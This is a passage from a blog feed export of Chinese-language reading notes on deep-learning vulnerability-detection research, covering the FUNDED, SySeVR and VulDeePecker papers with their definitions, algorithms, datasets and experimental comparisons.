CP 来估计每个专家输出的不合格分数，保留不合格分数高于置信水平的输出；然后根据对剩余输出的简单多数投票做出最终共识。</p><p>2.提取代码样本</p><p>对于通过 RE 过滤器的每个代码提交，使用代码更改来定位修补函数的先前版本,然后提取这个函数的代码，并将其与专家模型(作者在原文中将上述一组专家模型称为专家委员会)给出是否存在漏洞的标签相关联。</p><p>3.持续学习</p><p>使用 CP 的优势之一是可以用可信度较低的样本来随着时间的推移改进专家模型。</p><h1 id="4-实验"><a href="#4-实验" class="headerlink" title="4.实验"></a>4.实验</h1><p>对于漏洞检测，将 FUNDED 与六种相关方法进行比较：<a href="https://arxiv.org/pdf/1801.01681.pdf?source=post_page---------------------------">VULDEEPECKER</a>、<a href="https://arxiv.org/pdf/2001.02334.pdf">μVULDEEPECKER</a>、<a href="https://ieeexplore.ieee.org/abstract/document/8906156/footnotes#footnotes">LIN 等</a>、 <a href="http://prl.korea.ac.kr/~pronto/home/papers/snp17-KiWoLeOh.pdf">VUDDY</a>、 <a href="https://dl.acm.org/doi/pdf/10.1145/3276517">DEEPBUGS</a> 和  <a href="https://proceedings.neurips.cc/paper/2019/file/49265d2447bc3bbfe9e76306ce40a31f-Paper.pdf">DEVIGN</a>；前三个建立在 BiLSTM 之上，VUDDY 使用散列函数来发现易受攻击的代码克隆，DEEPBUGS 利用前馈神经网络进行错误检测，DEVIGN 使用标准 GNN 在具有非类型化 AST 边缘的图形表示上运行。除了 μVULDEEPECKER 之外，所有竞争方案都做出二元决策来预测代码是否包含错误或漏洞。</p><p>使用五重交叉验证来评估各自数据集上的所有方法(除非另有说明),该标准方法评估预测模型的泛化能力。另外四个常见指标：Accuracy、Precision、Recall、F1 score</p><p><img src="image-20240520151348891.png" alt="image-20240520151348891"></p><p><img src="image-20240520151354792.png" alt="image-20240520151354792"></p><p><img src="image-20240520151402849.png" alt="image-20240520151402849"></p><p>除了好看的之外，在 FFmpeg、ImageMagick 和 Linux 内核中各有一个 FUNDED 未能检测到但可以被其他人识别的漏洞，这种漏洞是由滥用 API 参数引起的，FUNDED 使用的 word2vec 模型不会捕获此类模式，这个问题可以通过使用更好的语言嵌入模型来解决。</p><p><img src="image-20240520151410780.png" alt="image-20240520151410780"></p><p><img src="image-20240520151418055.png" alt="image-20240520151418055"></p><p>在这个实验中，首先为一种语言训练一个基线模型;然后，应用迁移学习，使用交叉验证将基线模型移植到另一种语言：C to Java、Java to Php , C to Swift，其中第一个是基线模型训练的语言，第二个是要定位的新语言。下图表明，FUNDED 可以更好地利用先验知识来检测新编程语言的软件漏洞，这是因为 FUNDED 捕获了易受攻击代码模式的大部分与语言无关的信息，此功能对于训练样本稀缺的语言或库很有用。</p><p><img src="image-20240520151426781.png" alt="image-20240520151426781"></p><p>下图为数据收集框架评估</p><p><img src="image-20240520151437138.png" alt="image-20240520151437138"></p><p>基线模型额外的比较<br><img src="image-20240520151445833.png" alt="image-20240520151445833"></p><p>数据标记模型的实验</p><p><img src="image-20240520151452988.png" alt="image-20240520151452988"></p><p>漏洞类型预测准确度前三：<br><img src="image-20240520151459852.png" alt="image-20240520151459852"></p><p>扩展AST的比较<br><img src="image-20240520151506829.png" alt="image-20240520151506829"></p><p>嵌入比较</p><p><img src="image-20240520151512769.png" alt="image-20240520151512769"></p><p>训练开销比较</p><p><img src="image-20240520151525247.png" alt="image-20240520151525247"></p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SySeVR: A Framework for Using Deep Learning to Detect Software Vulnerabilities</title>
      <link href="/2023/03/20/SySeVR/"/>
      <url>/2023/03/20/SySeVR/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。[原文](<a href="https://mp.weixin.qq.com/s/5QNQmbYx6gAURanCfeWysg">微信公众平台 (qq.com)</a>)</p><blockquote><p><em>原文标题：SySeVR: A Framework for Using Deep Learning to Detect Software Vulnerabilities</em><br><em>原文作者：Zhen Li, Deqing Zou, Shouhuai Xu, Hai Jin, Fellow, IEEE, Yawei Zhu, and Zhaoxuan Chen</em><br><em>发表期刊：IEEE Transactions on Dependable and Secure Computing</em><br><em>原文链接：<a href="https://arxiv.org/pdf/1807.06756.pdf">https://arxiv.org/pdf/1807.06756.pdf</a></em><br><em>笔记作者：senu11@SecQuan</em><br><em>笔记小编：ourren@SecQuan</em>  </p></blockquote><p>本篇与VulDeePecker: A Deep Learning-Based System for Vulnerability Detection属于姊妹篇，是一个延伸。VulDeePecker 有四个弱点：(i) 只考虑与library&#x2F;API 函数调用相关的漏洞； (ii) 仅利用数据依赖性引起的语义信息； (iii) 仅考虑 BLSTM 的特定 RNN； (iv) 没有解释假阳性和假阴性的原因。</p><h1 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a>1.Background</h1><p>原文提出了<strong>第一个使用深度学习来检测 C&#x2F;C++ 源码程序的漏洞框架</strong>SySeVR（基于语法、基于语义和矢量表示）。原文对 4 个软件产品的进行了实验：检测到 15 个未在NVD中报告的漏洞。在这15个漏洞中，有7个0day，另外8个是厂商在发布相关软件产品的新版本时“悄悄”修补的。</p><p><strong>该框架以如何将程序表示为适用于漏洞检测且包含语法和语义信息的向量为中心</strong>。原文引入了基于语法的候选漏洞 (Syntax-based Vulnerability Candidates，SyVC) 和基于语义的候选漏洞 (Semantics-based Vulnerability Candidates，SeVC) 的概念。SyVCs 反映了漏洞语法特征，SeVCs 扩展了 SyVCs 以容纳由数据依赖和控制依赖引起的语义信息，并设计了自动提取 SyVC 和 SeVC 的算法。SySeVR 克服了 VulDeePecker的上述弱点。</p><h1 id="2-Data-Set-Project"><a href="#2-Data-Set-Project" class="headerlink" title="2.Data-Set &amp;&amp; Project"></a>2.Data-Set &amp;&amp; Project</h1><p><a href="https://github.com/SySeVR/SySeVR">https://github.com/SySeVR/SySeVR</a></p><p>该数据集包含 126 种类型漏洞，这些漏洞是从 NVD 和 SARD 中收集的。</p><h1 id="3-SySeVR-Framework"><a href="#3-SySeVR-Framework" class="headerlink" title="3.SySeVR Framework"></a>3.SySeVR Framework</h1><h2 id="3-1-Basic-Idea"><a href="#3-1-Basic-Idea" class="headerlink" title="3.1.Basic Idea"></a>3.1.Basic Idea</h2><p>原文灵感来自图像处理中区域提议的概念，如下图1(a)所示。</p><p>  <img src="image-20240520113945973.png" alt="image-20240520113945973"></p><p>下面两个讨论使原文将程序分成更小的包含漏洞的语法和语义特征的代码片段，对应于图像处理中“区域建议”。</p><p>（1）直接将程序中的每个函数视为图像处理中的区域提议，过于粗粒度，因为漏洞检测器不仅需要判断一个函数是否存在漏洞，还需要确定漏洞的位置，故需要细粒度表示。（2）将每一行代码或语句视为漏洞检测的一个单元。然而这种处理有两个缺点：（i）程序中的大多数语句不包含任何漏洞； (ii) 语义上相互关联的多个语句不被视为一个整体。</p><p>由于观察到漏洞表现出一些语法特征，例如函数调用或指针使用，因此使用语法特征来识别 SyVC，作为漏洞检测的起点；然后SeVC 扩展 SyVC 以包括与 SyVC 语义相关的语句。图 1(b) 突出显示了受区域提案概念启发的 SySeVR 框架。</p><h2 id="3-2-Extracting-SyVCs"><a href="#3-2-Extracting-SyVCs" class="headerlink" title="3.2.Extracting SyVCs"></a>3.2.Extracting SyVCs</h2><p>原文描述用漏洞语法特征来识别代码片段作为漏洞检测的初始候选者（即第一个阶段）。在下文的 EXPERIMENTS AND RESULTS节中会详细阐述提取漏洞语法特征的具体方法；原文表示这种方法并非完美，只涵盖了收集到的 93.6% 的易受攻击程序。</p><p>首先看两个个定义：</p><p><strong>Definition 1.program, function, statement, token</strong></p><p>程序 P 是一组函数 $f_1$, , , $f_η$, 记为 P &#x3D; {$f_1$, , , $f_η$}；函数 $f_i$ (1 ≤ i ≤ η)，是一组有序的语句 $S_{i,1}$, , , $S_{i,m_i}$ , 记为为 $f_i$ &#x3D; {$S_{i,1}$, , , $S_{i,m_i}$}；语句 $S_{i,j}$， 1 ≤ i ≤ η , 1 ≤ j ≤ mi，是一个有序的token集 $t_{i,j,1}$, , , $t_{i,j,w_{i,j}}$ ，记为 $S_{i,j}$ &#x3D; {$t_{i,j,1}$, , , $t_{i,j,w_{i,j}}$}。token可以是标识符、运算符、常量和关键字，并且可以通过语法分析来提取。给定一个函数 $f_i$，有生成其 AST 的标准套路。 AST的根对应函数$f_i$，AST的叶子对应token $t_{i,j,g}$(1 ≤ g ≤ $w_{i,j}$)，AST的内部结点对应语句$S_{i,j}$或者$S_{i,j}$的多重连续token。<strong>即若一个SyVC对应一个AST的叶子节点，则它是一个token；若对应一个AST的内部节点，则它是一个语句或者由多个连续的token组成。</strong></p><p><strong>Definition 2.SyVC</strong></p><p>给定一个程序 P &#x3D; {$f_1$, , , $f_η$}, 其中  $f_i$ &#x3D; {$S_{i,1}$, , , $S_{i,m_i}$},$S_{i,j}$ &#x3D; {$t_{i,j,1}$, , , $t_{i,j,w_{i,j}}$}。代码元素(以下简称码元)$e_{i,j,z}$由$S_{i,j}$的一个或多个连续token组成，即$e_{i,j,z}$ &#x3D; ($t_{i,j,u}$,,, $t_{i,j,v}$) ,1≤u≤v≤$w_{i,j}$ 。给定一组漏洞语法特征H &#x3D; {$h_k$},1≤k≤β，其中$h_k$表示一个漏洞语法特征，β为漏洞语法特征的个数，<strong>即匹配一个漏洞语法特征$h_k$的码元$e_{i,j,z}$称为SyVC</strong>。</p><p>现给定<strong>算法1</strong>，如下所示,描述了如何从给定程序 P &#x3D; {$f_1$, , , $f_η$} 和一组 H &#x3D; {$h_k$},1≤k≤β 的漏洞语法特征来提取SyVCs。具体来说，算法 1 为每个函数 $f_i$ 生成一个 AST $T_i$；然后，算法1遍历$T_i$来识别SyVCs。即“匹配”一些{$h_k$}的码元，其中“匹配”操作与漏洞语法特征的表示有关。另外，一个 SyVC 可能是另一个 SyVC 的一部分。<br><img src="image-20240520114017054.png" alt="image-20240520114017054"></p><p>下面详细阐述如何提取SyVC</p><h2 id="3-2-1-Extracting-vulnerability-syntax-characteristics"><a href="#3-2-1-Extracting-vulnerability-syntax-characteristics" class="headerlink" title="3.2.1.Extracting vulnerability syntax characteristics"></a>3.2.1.Extracting vulnerability syntax characteristics</h2><p>原文利用商业工具 Checkmarx 的 C&#x2F;C++ 漏洞规则来分析漏洞语法特征，因为开源工具（例如 Flaw$f_i$nder 和 RATS ）的解析器过于简单，规则不完善，故不选择。</p><p>有以下 4 种漏洞语法特征（每种都包含许多漏洞）：</p><p>• Library&#x2F;API 函数调用（简称 FC）：这种语法特征涵盖了与原文的数据集一起发布的 811 个Library&#x2F;API 函数调用，共106种CWE。</p><p> • Array Usage（简称AU）：这种语法特征涵盖了与数组相关的87种CWE（例如，与数组元素访问、数组地址算法相关的问题）。</p><p> • Pointer Usage（简称PU）：这种语法特征涵盖了与指针相关的103种CWE（例如，在指针运算、引用、作为函数参数的地址传递中的不当使用）。 </p><p>• Arithmetic Expression（简称AE）：这种语法特征涵盖了45种与不正确的算术表达式相关的CWE（例如，整数溢出）。</p><p>下图显示了这 4 种语法特征在它们所涵盖的 CWE 方面相互重叠。这4种语法特征是从126个CWE ID对应的程序中产生的。一种语法特征可以覆盖多个CWE，并且一个CWE可以被一种或多种语法特征覆盖。</p><p><img src="image-20240520114028325.png" alt="image-20240520114028325"></p><h2 id="3-2-2-Matching-syntax-characteristics"><a href="#3-2-2-Matching-syntax-characteristics" class="headerlink" title="3.2.2.Matching syntax characteristics."></a>3.2.2.Matching syntax characteristics.</h2><p>为了使用算法1提取SyVC，需要判断程序P中函数$f_i$的抽象语法树Ti上的代码元素$e_{i,j,z}$是否匹配漏洞语法特征。可以使用 Joern 生成 $T_i$。下面的方法，通过图2所示的示例程序，如图5所示，可以自动判断码元$e_{i,j,z}$是否符合语法特征。</p><p><img src="image-20240520114037872.png" alt="image-20240520114037872"></p><p> • 如图 5(a) 所示，如果满足以下两个条件则码元$e_{i,j,z}$匹配FC语法特征：</p><pre><code>(i) $e_&#123;i,j,z&#125;$ 被调用；(ii) $e_&#123;i,j,z&#125;$ 是上述 811 个函数调用之一。</code></pre><p> • 如图 5(b) 所示，如果满足以下两个条件则码元$e_{i,j,z}$(如“memset”)匹配AU语法特征：</p><pre><code>(i) $e_&#123;i,j,z&#125;$ 是在标识符声明语句中声明的标识符（即IdentifierDeclStatement) 节点；(ii) IdentifierDeclStatement 节点包含字符 “[” 和 “]”。</code></pre><p> • 如图 5(c) 所示，如果满足以下两个条件则码元$e_{i,j,z}$(如 “source”)匹配PU语法特征：</p><pre><code>(i) $e_&#123;i,j,z&#125;$ 是在 IdentifierDeclStatement 节点中声明的标识符；(ii) IdentifierDeclStatement 节点包含字符“*”。</code></pre><p> • 如图 5(d) 所示，如果满足以下两个条件则码元$e_{i,j,z}$(“data&#x3D;dataBuffer-8”)(如“data”)匹配AE语法特征：</p><pre><code>(i) $e_&#123;i,j,z&#125;$ 是表达式语句 (ExpressionStatement)；(ii)$e_&#123;i,j,z&#125;$ 包含一个字符“=”，并且在“=”的右侧有一个或多个标识符。</code></pre><h2 id="3-2-3-Extracting-SyVCs"><a href="#3-2-3-Extracting-SyVCs" class="headerlink" title="3.2.3.Extracting SyVCs"></a>3.2.3.Extracting SyVCs</h2><p>现在就可以使用算法1提取SyVCs了。总共提取了420,627 个 SyVC，涵盖了从 SARD 收集的 13,016 个易受攻击的程序；计算覆盖率为 93.6%，是因为 SARD 给出了每个漏洞的精确位置；相反，无法计算 NVD 的覆盖率，因为它没有给出漏洞的精确位置。提取 SyVC 的平均时间为 270 毫秒。</p><h2 id="3-3-Transforming-SyVCs-to-SeVCs"><a href="#3-3-Transforming-SyVCs-to-SeVCs" class="headerlink" title="3.3.Transforming SyVCs to SeVCs"></a>3.3.Transforming SyVCs to SeVCs</h2><p>为了检测漏洞，需要将 SyVC 转换为 SeVC，以容纳与相关 SyVC 语义相关的语句。原文利用程序切片技术来识别与 SyVC 语义相关的语句，需要使用程序依赖图（PDG），进一步需要使用在控制流图 (CFG) 上定义的数据依赖和控制依赖。</p><p>现在了解以下CFG、data dependency、control dependency、PDG</p><p><strong>Definition 3.CFG</strong></p><p>对于程序 P &#x3D; {$f_1$, , , $f_η$}，函数$f_i$的CFG是一个图 $G_i$ &#x3D; ($V_i$, $E_i$)，$V_i$ &#x3D; {$n_{i,1}$, , , $n_{i,c_i}$ } 是一组节点，每个节点代表一个语句或控制谓词，Ei &#x3D; {$e_{i,1}$, , , $e_{i,d_i}$ } 是一组直接边，每条边代表一对节点之间可能的控制流。</p><p><strong>Definition 4.data dependency</strong></p><p>给定一个程序 P &#x3D; {$f_1$, , , $f_η$}, 函数 $f_i$ 的 CFG 为 $G_i$ &#x3D; ($V_i$, $E_i$),$G_i$ 中的两个节点 $n_{i,j}$ 和 $n_{i,e}$, 其中1 ≤ j, e ≤ $c_i$ ,j ≠ e。若在 $G_i$ 中存在从 $n_{i,e}$ 到 $n_{i,j}$的路径，并且在节点$n_{i,e}$ 处计算的值被用于节点 $n_{i,j}$，则 $n_{i,e}$是 $n_{i,j}$ 的数据依赖。</p><p><strong>Definition 5.control dependency</strong></p><p>给定一个程序P &#x3D; {$f_1$, , , $f_η$}, 函数 $f_i$ 的 CFG 为 $G_i$ &#x3D; ($V_i$, $E_i$),$G_i$ 中的两个节点 $n_{i,j}$ 和 $n_{i,e}$, 其中1 ≤ j, e ≤ ci ,j ≠ e。 若从  $n_{i,e}$ 开始到程序结束的所有路径都经过 $n_{i,j}$，称 $n_{i,j}$ 后支配$n_{i,e}$；若存在一条从 $n_{i,e}$ 开始到 $n_{i,j}$ 结束的路径，使得 :</p><p>(i). $n_{i,j}$ 后支配路径上除 $n_{i,e}$ 和 $n_{i,j}$ 之外的每个节点，</p><p>(ii). $n_{i,j}$ 不后支配 $n_{i,e}$，</p><p>则 $n_{i,j}$ 控制依赖于 $n_{i,e}$。</p><p>基于数据依赖和控制依赖，PDG可以定义如下。</p><p><strong>Definition 6.PDG</strong></p><p>给定一个程序 P &#x3D; {$f_1$, , , $f_η$}, 函数$f_i$的PDG记为 $G_i’$ &#x3D; ($V_i$, $E_i’$)，其中$V_i$与CFG $G_i$中的相同，$E_i$′ &#x3D; { $e_{i,1}’$,,,$e_{i,d_i}’$} 是一组直接边，每条边代表一对节点之间的数据或控制依赖关系。</p><h2 id="3-3-1-Program-Slices"><a href="#3-3-1-Program-Slices" class="headerlink" title="3.3.1.Program Slices"></a>3.3.1.Program Slices</h2><p>给定 PDG，就可以从 SyVC 中提取程序片段。同时考虑前向和后向切片，这是因为：<br>（i）SyVC 可能会影响一些后续语句，因此可能包含漏洞；<br>(ii) 影响 SyVC 的语句可能使 SyVC 易受攻击</p><p><strong>Definition 7.forward, backward, and program slices of a SyVC</strong></p><p>给定一个程序 P &#x3D; {$f_1$, , , $f_η$}，每个函数 $f_i$ (1 ≤ i ≤ η) 的 PDG $G_i’$ &#x3D; ($V_i$, $E_i’$)，以及 $G_i′$ 中语句$S_{i,j}$ 的 SyVC, $e_{i,j,z}$。</p><p>函数$f_i$的前向切片SyVC $e_{i,j,z}$，由 $fs_{i,j,z}$ 表示，被定义为一组有序的节点 {$n_{i,x_1}$,,,$n_{i,x_{μ_i}}$} ⊆ $V_i$，其中的 $n_{i,x_p}$ , 1 ≤ $x_1$ ≤ $x_p$ ≤ $x_{μ_i}$ ≤ $c_i$，可从 Gi’ 中的 $e_{i,j,z}$到达。也就是说，f$s_{i,j}$ 中的节点来自 Gi′ 中从 $e_{i,j,z}$ 开始的所有路径。</p><p>程序 P 中的过程间前向切片SyVC $e_{i,j,z}$ ，由 $fs_{i,j,z}’$ 表示，被定义为一组有序的节点，其中:</p><p>(i) 一个节点属于一个或多个 PDG;</p><p>(ii)每个节点都可以通过一系列函数调用从 $e_{i,j,z}$ 出发到达。</p><p>也就是说，有或没有交叉函数边界（通过函数调用）， $fs_{i,j,z}’$都是一个前向切片。</p><p>函数$f_i$的后向切片SyVC $e_{i,j,z}$，由 $bs_{i,j,z}$ 表示，被定义为一组有序的节点 {$n_{i,y_1}$,,,$n_{i,y_{v_i}}$} ⊆ $V_i$，其中 $n_{i,y_{p’}}$ , 1 ≤ $y_1$ ≤ $y_p$ ≤ $y_{v_i}$ ≤ $c_i$，由此 $e_{i,j,z}$ 在 $G_i′$ 中可达。也就是说，$bs_{i,j,z}$ 中的节点来自 $G_i′$ 中以 $e_{i,j,z}$ 结束的所有路径。</p><p>程序 P 中的过程间后向切片SyVC $e_{i,j,z}$ ，表示为 $bs_{i,j,z}’$，被定义为一组有序的节点，其中 :</p><p>(i) 一个节点属于一个或多个 PDG;</p><p>(ii)每个节点都可以通过一系列函数调用到达 $e_{i,j,z}$。</p><p>也就是说， $bs_{i,j,z}’$ 有或没有交叉函数边界（通过函数调用）,都是一个后向切片。</p><p>给定过程间前向切片  $fs_{i,j,z}’$ 和过程间后向切片$bs_{i,j,z}’$，SyVC $e_{i,j,z}$ 的（过程间）程序切片由 $ps_{i,j,z}$ 表示，定义为通过在 SyVC $e_{i,j,z}$ 处合并  $fs_{i,j,z}’$ 和 $bs_{i,j,z}’$ 的有序节点集（属于 P 中函数的 PDG）。也就是说， $ps_{i,j,z}$ 是一个有序集合，它是通过以保序方式连接前向切片  $fs_{i,j,z}’$ 和后向切片$bs_{i,j,z}’$ 而省略相邻的重复节点（即使用一个节点替换同一节点的多个相邻节点）获得的。</p><p>在图3中，第三列显示了SyVC“数据”的过程间前向切片、过程间后向切片和程序切片（程序源代码中的第25行）。 SyVC“数据”的过程间前向切片跨越函数 func 和 println。 SyVC“数据”的过程间后向切片与函数func中SyVC“数据”的后向切片相同，因为没有其他函数调用函数func。 SyVC“数据”的程序切片是通过连接过程间前向切片和过程间后向切片，同时省略SyVC“数据”对应节点的一个（两个）相邻出现（程序源码第25行）得到的。</p><h3 id="3-3-2-Defining-SeVCs"><a href="#3-3-2-Defining-SeVCs" class="headerlink" title="3.3.2.Defining SeVCs"></a>3.3.2.Defining SeVCs</h3><p>提取 SyVC 的程序片段后，现在可以定义 SeVC了。</p><p><strong>Definition 8. SeVC</strong>.</p><p>给定一个程序 P &#x3D; {$f_1$, …, $f_η$} 和一个在函数 $f_i$ 的语句 $S_{i,j}$ 中的 SyVC $e_{i,j,z}$，对应于 SyVC $e_{i,j,z}$ 的 SeVC，用 $δ_{i,j,z}$ 表示，被定义为 P 语句中的有序子集，用 $δ_{i,j,z}$ &#x3D; {$S_{a_1,b_1}$, …, $S_{a_{v_{i,j,z}}, b_{v_{i,j_z}}}$}其中语句$S_{a_p,b_q}$ (1 ≤ p, q ≤ $v_{i,j,z}$)和 SyVC $e_{i,j,z}$之间存在数据依赖或控制依赖。换句话说，SeVC $δ_{i,j,z}$ 是一组有序的语句，对应于（过程间）程序切片 $ps_{i,j,z}$ 的节点。</p><h3 id="3-3-3-Computing-SeVCs"><a href="#3-3-3-Computing-SeVCs" class="headerlink" title="3.3.3.Computing SeVCs"></a>3.3.3.Computing SeVCs</h3><p><img src="image-20240520114048953.png" alt="image-20240520114048953"><br>算法 2 将前面的讨论生成 PDG总结为三个步骤；算法 1 输出 SyVC 的程序片段；并将程序切片转换为 SeVCs。下面详细说明这些步骤，并使用图 3 来说明一个运行实例。具体来说，图 3 详细说明了 SyVC “data”（与指针使用相关)的 SyVC→SeVC 转换，同时容纳由数据依赖性和控制依赖性引起的语义信息。</p><p><img src="image-20240520114059976.png" alt="image-20240520114059976"></p><p><strong>步骤 1</strong>（算法 2 中的第 2-4 行）。此步骤为每个函数生成一个 PDG,已有<a href="https://dl.acm.org/doi/pdf/10.1145/24039.24041">算法</a>。作为运行实例，图3的第二列显示了分别对应函数 func 和 println 的PDG，其中每个数字代表一条语句的行号。</p><p><strong>步骤 2</strong>（算法 2 中的第 6-9 行）。此步骤为每个 SyVC $e_{i,j,z}$ 生成程序切片  $ps_{i,j,z}$。过程间前向切片 $fs_{i,j,z}’$ 是通过合并 $fs_{i,j,z}$ 和来自 $f_i$ 调用的函数前向切片获得的。过程间后向切片 $bs_{i,j,z}’$ 是通过合并 $bs_{i,j,z}$ 和来自 $f_i$ 调用的函数和调用 $f_i$ 的函数的后向切片获得的。最后，$fs_{i,j,z}’$ 和$bs_{i,j,z}’$ 被合并成一个程序片 $ps_{i,j,z}$。</p><p>来个实例说明，图 3 中的第三列显示了 SyVC “data” 的程序切片，其中后向切片对应函数 func，前向切片对应函数 func 和 println。为了获得 SyVC 的前向切片，仅利用数据依赖性，有两个原因：（i）在大多数情况下，通过控制依赖性受 SyVC 影响的语句不会受到攻击，（ii）利用具有对 SyVC 的控制依赖将涉及许多与漏洞无关的语句。例如，考虑“while”循环的条件表达式中的指针变量 SyVC，若在“while”循环体中没有引用指针变量，“while”循环体中的语句仅通过控制依赖性受到 SyVC 的影响，意味着 SyVC 不会在“while”循环的主体；若与 SyVC 相关的指针变量的前向切片涉及控制依赖，则“while”循环体中所有依赖于 SyVC 的控制语句将包含在 SeVC 中，尽管它们具有与漏洞关系不大。另一方面，为了获得 SyVC 的后向切片，同时利用了数据依赖性和控制依赖性。</p><p><strong>步骤 3</strong>（算法 2 中的第 10-19 行）。此步骤将程序切片转换为 SeVCs。首先，该算法将属于函数 $f_i$ 并作为节点出现在 $ps_{i,j,z}$中的语句转换为 SeVC，同时保留这些语句在 $f_i$ 中的顺序。如图3所示的运行实例，13条语句属于函数func，3条语句属于函数println，根据这两个函数中这些语句的顺序，得到两组有序的语句：Lines {7, 9, 10, 11, 12, 14, 16, 18, 22, 23, 24, 25, 26}和Lines {1, 3, 4}。其次，该算法将属于不同函数的语句转换为一个 SeVC。对于作为节点出现在 $ps_{i,j,z}$ 中的语句 $S_{i,j}$ ∈ $f_i$ 和 $S_{a_p,b_q}$ ∈ $f_{a_p}$(i≠$a_p$) ，如果 $f_i$ 调用 fap ，则 $S_{i,j}$ 和 $S_{a_p,b_q}$ 的函数调用顺序相同, 即 $S_{i,j}$ &lt; $S_{a_p,b_q}$ ;否则， $S_{i,j}$ &gt; $S_{a_p,b_q}$ 。在图三中，SeVC为Lines {7, 9, 10, 11, 13, 14, 16, 18, 22, 23, 24, 25, 26, 1, 3, 4}，其中函数 func 中的语句出现在函数 println 中的语句之前，因为 func 调用了 println。图3中的第四列显示了与 SyVC“data” 对应的SeVC，即与 SyVC “data” 在语义上相关的一组语句。</p><h2 id="3-4-Encoding-SeVCs-into-Vectors"><a href="#3-4-Encoding-SeVCs-into-Vectors" class="headerlink" title="3.4.Encoding SeVCs into Vectors"></a>3.4.Encoding SeVCs into Vectors</h2><p><img src="image-20240520114112013.png" alt="image-20240520114112013"></p><p>算法 3 分三步将 SeVCs 编码为向量。</p><p><strong>步骤 1</strong>（算法 3 中的第 2-6 行）。为了在捕获程序语义信息的同时使 SeVCs 独立于用户定义的变量和函数名称，每个 SeVC δ(i,j,z) 都被转换为符号表示。原文建议删除非 ASCII 字符和注释，然后将用户定义的变量名以一对一的方式映射到符号名（例如，“V1”、“V2”），最后映射用户定义的变量名。以一对一的方式将函数名称转换为符号名称（例如，“F1”、“F2”）。不同的 SeVCs 可能具有相同的符号表示。</p><p><strong>步骤 2</strong>（算法 3 中的第 8-13 行）。将符号表示用word2vec编码为向量。原文通过词法分析（例如，“V1”、“&#x3D;”、 “V2”、“-”、“8”和“;”）将 SeVC $δ_{i,j,z}$符号表示分为连续的符合，再将每个符号转换为固定长度的向量，通过连接向量，得每个 SeVC 的向量 $R_{i,j,z}$。</p><p><strong>步骤 3</strong>（算法 3 中的第 14-22 行）。因为符号的数量（即表示 SeVC 的向量）可能不同，且神经网络采用与输入相同长度的向量，使用阈值 θ 作为神经网络输入的向量长度.当一个向量比 θ 短时，零被填充到向量的末尾；当向量长于 θ 时，有三种情况，但基本思想是使 SyVC 出现在结果向量的之中：</p><p>(i) 到 SyVC 的子向量比 θ&#x2F;2 短。在这种情况下，删除 $R_{i,j,z}$ 的最右边部分以使结果向量的长度为 θ。</p><p>(ii) SyVC 邻居的子向量比 θ&#x2F;2 短。在这种情况下，删除 $R_{i,j,z}$ 的最左边部分，使结果向量的长度为 θ。</p><p>(iii) 将长度为 ⌊(θ − 1)&#x2F;2⌋ 的子向量保留在 SyVC 的最左边，长度为 ⌈(θ − 1)&#x2F;2⌉ 的子向量直接保留在 SyVC 的右边。与 SyVC 一起，获得了一个长度为 θ 的向量。例如，假设 θ &#x3D; 15000，每个符号的长度为 30，这意味着每个 SeVC 有 500 个符号。假设一个SeVC中的符号数是510（因此需要减少到500），而SyVC在第255个符号的位置（在510个符号中），那么保留紧邻SyVC的249个连续符号和紧邻 SyVC 的 250 个符号。与 SyVC 一起，获得了一个包含 500&#x3D;249+1+250 个符号的向量。每个 SyVC 都被转换为 SeVC，并且在 SeVC 中只出现一次。</p><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><p>使用word2vec编码<br><img src="image-20240520114128180.png" alt="image-20240520114128180"><br>使用bag-of-words编码</p><p><img src="image-20240520114140654.png" alt="image-20240520114140654"></p><p><img src="image-20240520114148972.png" alt="image-20240520114148972"></p><p>考虑了control-dependency<br><img src="image-20240520114157647.png" alt="image-20240520114157647"></p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulDeePecker: A Deep Learning-Based System for Vulnerability Detection</title>
      <link href="/2023/03/16/VulDeePecker/"/>
      <url>/2023/03/16/VulDeePecker/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。<a href="https://mp.weixin.qq.com/s/bB8a0Pgh23zy2tlxxtnV1g">原文</a></p><blockquote><p><em>原文标题：VulDeePecker: A Deep Learning-Based System for Vulnerability Detection</em><br><em>原文作者：Zhen Li, Deqing Zou, Shouhuai Xu, Xinyu Ou, Hai Jin, Sujuan Wang, Zhijun Deng, Yuyi Zhong</em><br><em>发表期刊：Proceedings 2018 Network and Distributed System Security Symposium</em> <em>原文链接：<a href="https://www.ndss-symposium.org/wp-content/uploads/2018/02/ndss2018_03A-2_Li_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2018/02/ndss2018_03A-2_Li_paper.pdf</a></em><br><em>笔记作者：senu11@SecQuan</em><br><em>笔记小编：ourren@SecQuan</em></p></blockquote><h1 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a><strong>1.Background</strong></h1><p>软件漏洞的自动检测是一个重要的研究课题，但是该问题的现有解决方案依赖于人类专家来定义特征，并且经常导致高漏报率。作者提出基于深度学习的进行漏洞检测来开展研究，使用code gadget（一行行的代码，在数据依赖或控制依赖方面和语义上相互关联）来表示程序，然后将它们转换为向量。设计并实现了一个基于深度学习的漏洞检测系统，称为Vulnerability Deep Pecker (VulDeePecker)。为了评估 VulDeePecker，提出了<strong>第一个用于深度学习方法的漏洞数据集</strong>。进一步将VulDeePecker应用于Xen、Seamonkey和Libav 3个软件产品，检测到4个漏洞，这些漏洞未在NVD报告，但在发布这些产品的更高版本时被厂商修补。</p><h1 id="2-Data-set"><a href="#2-Data-set" class="headerlink" title="2.Data-set"></a><strong>2.Data-set</strong></h1><p><a href="https://github.com/CGCL-codes/VulDeePecker">https://github.com/CGCL-codes/VulDeePecker</a></p><p>数据集源自 NIST 维护的两个数据源：NVD和SARD(软件保障参考数据集)项目。该数据集包含61638个code gadget，其中17725个易受攻击的code gadget和43913个不易受攻击的code gadget。在易受攻击的17725个code gadget中，10440个code gadget对应缓冲区错误漏洞（CWE-119），其余7285个code gadget对应资源管理错误漏洞（CWE-399）。</p><h2 